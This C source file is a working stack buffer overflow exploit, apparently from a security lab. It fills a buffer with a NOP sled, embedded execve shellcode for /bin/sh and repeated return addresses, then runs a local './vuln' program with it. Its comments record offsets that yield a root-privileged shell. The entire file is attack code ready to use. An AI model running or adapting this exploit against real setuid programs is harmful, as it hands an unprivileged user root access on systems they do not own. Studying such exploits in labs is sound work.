#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

// Hex code to run bash shell
// See shellcode.asm for the actual assembly code, but the main idea is to call
// execve("/bin/sh", "/bin/sh"<NULL>, NULL);
char shellcode[] =
"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0"
"\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d"
"\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73"
"\x68";

// Offset between stack pointer and return address
// #define OFFSET 882 Root privileged bash shell
// #define OFFSET 874 Unprivileged bash shell
// #define OFFSET 0 Segmentation fault: Illegal instruction
#define OFFSET 882 //876 //988 // 0

// Size of the buffer in Bytes
#define BUFFER_SIZE 600

// Size of a 32 bit pointer
#define PTR_SIZE 4

// Size of NOP block
// Works if set to 0 and OFFSET = 1082, for instance
#define NOP_BLOCK_SIZE 200
// NOP
#define NOP '\x90'

// Returns the stack pointer
unsigned long sp(void)
{
    __asm__("movl %esp, %eax");
}

int main(int argc, char *argv[])
{
    int i, offset;
    long esp, ret, *addr_ptr;
    char *buffer, *ptr;

    offset = OFFSET;            // Use an offset of 0
    esp = sp();                 // Put the current stack pointer into esp
    ret = esp - offset;         // We want to overwrite the ret address

    printf("Stack pointer (ESP): 0x%lx \n", esp);
    printf("    Offset from ESP: 0x%x  \n", offset);
    printf("Desired Return Addr: 0x%lx \n", ret);

    printf("Length of shellcode: 0x%x  \n", strlen(shellcode));

    // Allocate BUFFER_SIZE bytes for buffer (on the heap)
    buffer = malloc(BUFFER_SIZE);

    // Fill the entire buffer with the desired ret address
    ptr = buffer;
    addr_ptr = (long *) ptr;
    for(i=0; i < BUFFER_SIZE; i+=PTR_SIZE)
    {
        *(addr_ptr++) = ret;
    }

    // Fill the first NOP_BLOCK_SIZE bytes of the buffer with NOP instructions
    for(i=0; i < NOP_BLOCK_SIZE; i++)
    {
        buffer[i] = NOP;
    }

    // Put the shellcode after the NOP sled
    ptr = buffer + NOP_BLOCK_SIZE;
    for(i=0; i < strlen(shellcode); i++)
    {
        *(ptr++) = shellcode[i];
    }

    // Terminate the string
    buffer[BUFFER_SIZE - 1] = 0;

    // Now call the program ./vuln with our crafted buffer as its argument
    execl("./vuln", "vuln", buffer, NULL);

    return 0;
}
